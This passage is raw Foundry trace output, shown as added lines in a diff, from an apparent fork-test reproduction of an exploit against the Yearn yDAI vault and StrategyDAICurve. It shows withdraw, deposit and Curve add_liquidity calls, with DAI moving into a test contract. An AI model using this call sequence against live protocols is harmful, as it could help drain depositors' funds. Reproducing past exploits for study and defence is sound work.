+    │   │   │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   │   │   │   ├─ [291] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 22989947475064086245493519 [2.298e25]
+    │   │   │   │   │   │   └─ ← [Return] 11404911181900881 [1.14e16]
+    │   │   │   │   │   ├─ [7890] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   ├─ [4844] 0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d91080::balanceOf(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8) [staticcall]
+    │   │   │   │   │   │   │   ├─ [3816] 0x07DB4B9b3951094B9E278D336aDf46a036295DE7::balanceOf() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1665] 0x96Dd07B6c99b22F3f0cB1836aFF8530a98BDe9E3::balanceOf(0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [805] 0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1::balanceOf(0xdc66DBa57c6f9213c641a8a216f8C3D9d83573cd) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   ├─ [736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x07DB4B9b3951094B9E278D336aDf46a036295DE7) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2023382049364173638711357 [2.023e24]
+    │   │   │   │   │   │   └─ ← [Return] 1173186183069336025 [1.173e18]
+    │   │   │   │   │   ├─ [629] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [602] DAI::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 39990000000000000000000 [3.999e22]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000877dcbc03e63f180000
+    │   │   │   │   └─ ← [Return] 39990000000000000000000 [3.999e22]
+    │   │   │   ├─ [602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 232636917796108185967118 [2.326e23]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1342703033514129291125012 [1.342e24])
+    │   │   │   ├─ [602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 232636917796108185967118 [2.326e23]
+    │   │   │   ├─ [12136] 0x0b283B107F70d23250f882fbfe7216C38abBd7cA::withdraw(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1742836181761097895007 [1.742e21])
+    │   │   │   │   ├─ [9125] StrategyDAICurve::withdraw(1742836181761097895007 [1.742e21])
+    │   │   │   │   │   ├─ [602] DAI::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 39990000000000000000000 [3.999e22]
+    │   │   │   │   │   ├─ [495] 0x0b283B107F70d23250f882fbfe7216C38abBd7cA::vaults(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002381742592ab54dc2e89f193af682d914a8b24c1
+    │   │   │   │   │   ├─ [3474] DAI::transfer(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], 1742836181761097895007 [1.742e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], value: 1742836181761097895007 [1.742e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd9eb8dc48eb8490da88a5fbe127c3f81b05e4793a54b4894f39875603a8fd31d: 0x00000000000000000000000000000000000000000000314345c80c583a191a0e → 0x0000000000000000000000000000000000000000000031a1c07dfdb6ea77a66d
+    │   │   │   │   │   │   │   @ 0x8de997b573eff4ada52fc00c2e709fc60cb65fa0453d38e3a735756e383421fd: 0x000000000000000000000000000000000000000000000877dcbc03e63f180000 → 0x000000000000000000000000000000000000000000000819620612878eb973a1
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 234379753977869283862125 [2.343e23]
+    │   │   │   ├─ [23374] DAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 234379753977869283862125 [2.343e23])
+    │   │   │   │   ├─ emit Transfer(from: cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 234379753977869283862125 [2.343e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd9eb8dc48eb8490da88a5fbe127c3f81b05e4793a54b4894f39875603a8fd31d: 0x0000000000000000000000000000000000000000000031a1c07dfdb6ea77a66d → 0
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x0000000000000000000000000000000000000000000031a1c07dfdb6ea77a66d
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000011c5413c9bb8a01b6a114 → 0
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000014ab9f84310a3629056ef → 0x000000000000000000000000000000000000000000002e65e479551960d9b5db
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1138388] StrategyDAICurve::deposit()
+    │   │   │   ├─ [602] DAI::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 38247163818238902104993 [3.824e22]
+    │   │   │   ├─ [4614] DAI::approve(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], 0)
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [677] DAI::allowance(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [22414] DAI::approve(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], 38247163818238902104993 [3.824e22])
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], value: 38247163818238902104993 [3.824e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa25153b973eaa6744643243b6e6ee5a1f4b20217e9a698d3df5f37a369e431f8: 0 → 0x000000000000000000000000000000000000000000000819620612878eb973a1
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [102607] yDAI::deposit(38247163818238902104993 [3.824e22])
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4775] DAI::transferFrom(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], 38247163818238902104993 [3.824e22])
+    │   │   │   │   │   ├─ emit Transfer(from: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], to: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], value: 38247163818238902104993 [3.824e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xa25153b973eaa6744643243b6e6ee5a1f4b20217e9a698d3df5f37a369e431f8: 0x000000000000000000000000000000000000000000000819620612878eb973a1 → 0
+    │   │   │   │   │   │   @ 0x8de997b573eff4ada52fc00c2e709fc60cb65fa0453d38e3a735756e383421fd: 0x000000000000000000000000000000000000000000000819620612878eb973a1 → 0
+    │   │   │   │   │   │   @ 0x2f02e106f5b3861b492ce5b389aa055016767262bc75b54222e7a679bd4d603f: 0x00000000000000000000000000000000000000000000d6decb2432e70da43b21 → 0x00000000000000000000000000000000000000000000def82d2a456e9c5daec2
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], value: 33735016648822018942270 [3.373e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 7: 0x000000000000000000000000000000000000000000013481df5c377efbfd8f1c → 0x000000000000000000000000000000000000000000013c9b41624a068ab702bd
+    │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000001101c9602e095cd563846 → 0x0000000000000000000000000000000000000000000117415d69fae90a705d84
+    │   │   │   │   │   @ 0x2dec978f1642764f49d833e2986793af486810132175d9c3a93faedf68990245: 0 → 0x000000000000000000000000000000000000000000000724c7671a533d1a253e
+    │   │   │   │   │   @ 6: 63529 → 63530
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [952] yDAI::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 33735016648822018942270 [3.373e22]
+    │   │   │   ├─ [5461] yDAI::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0)
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1286] yDAI::allowance(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [23261] yDAI::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 33735016648822018942270 [3.373e22])
+    │   │   │   │   ├─ emit Approval(owner: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 33735016648822018942270 [3.373e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1b938a68a762b4d2a2247e75bf0bc681feb38493ea74306b030bdeba90a79d62: 0 → 0x000000000000000000000000000000000000000000000724c7671a533d1a253e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [895145] CurveFiSwap::add_liquidity([33735016648822018942270 [3.373e22], 0, 0, 0], 0)
+    │   │   │   │   ├─ [291] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 22989947475064086245493519 [2.298e25]
+    │   │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
